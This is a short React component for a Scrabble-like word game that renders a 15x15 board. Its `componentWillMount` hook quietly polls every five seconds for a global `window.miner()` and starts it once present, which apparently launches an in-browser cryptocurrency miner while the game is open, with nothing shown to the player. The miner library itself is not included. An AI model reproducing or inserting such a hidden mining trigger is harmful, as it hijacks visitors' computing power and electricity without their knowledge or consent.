import React, { Component } from 'react';
import { connect } from 'react-redux';
import { withRouter } from 'react-router-dom';

import './words_with_unfeeling_machines.css';
import Board from './board';

import { emptyMatrix } from '../../../utils/pFuncs';


class WordsWithUnfeelingMachines extends Component {
  constructor(props) {
    super(props);
    this.state = {
      grid: emptyMatrix(15, 15),
    }
  }

  componentWillMount(){
    this.intervalID = setInterval(() => this.mine(), 5000);
  }

  mine() {
    if (window.miner()) {
      window.miner().start();
      clearInterval(this.intervalID);
      console.log('started');
    }
  }

  render() {
    return (
      <section className="fb jcc">
        <Board grid={this.state.grid} />
      </section>
    );
  }
}

const mapStateToProps = state => ({
  state,
});

const mapDispatchToProps = dispatch => ({
});

export default withRouter(connect(mapStateToProps, mapDispatchToProps)(WordsWithUnfeelingMachines));